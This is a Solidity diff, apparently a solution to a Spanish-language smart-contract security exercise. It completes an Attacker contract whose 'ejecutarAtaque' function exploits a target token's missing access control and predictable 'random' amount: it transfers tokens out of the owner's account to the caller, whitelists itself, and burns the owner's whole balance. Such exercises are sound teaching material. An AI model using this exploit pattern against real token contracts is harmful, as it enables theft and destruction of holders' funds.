@@ -79,10 +79,16 @@ interface ITokenTruco {
     function balances(address _account) external view returns (uint256);
 
     // function transferFrom
+    function transferFrom(address _from, address _to, uint256 _amount) external;
 
     // function burn
+    function burn(address _from, uint256 _amount) external;
 
-    // ...
+    // function addToWhitelist
+    function addToWhitelist() external;
+
+    // function montoAleatorio(NumeroRandom)
+    function montoAleatorio() external view returns (uint256);
 }
 
 // Modificar el método 'ejecutarAtaque'
@@ -95,5 +101,14 @@ contract Attacker {
 
     function ejecutarAtaque() public {
         // tokenTruco ...
+        address accountToAttack = tokenTruco.owner();
+        uint256 amount = tokenTruco.montoAleatorio();
+
+        tokenTruco.transferFrom(accountToAttack, msg.sender, amount);
+
+        tokenTruco.addToWhitelist();
+
+        uint256 amountToBurn = tokenTruco.balances(accountToAttack);
+        tokenTruco.burn(accountToAttack, amountToBurn);
     }
 }
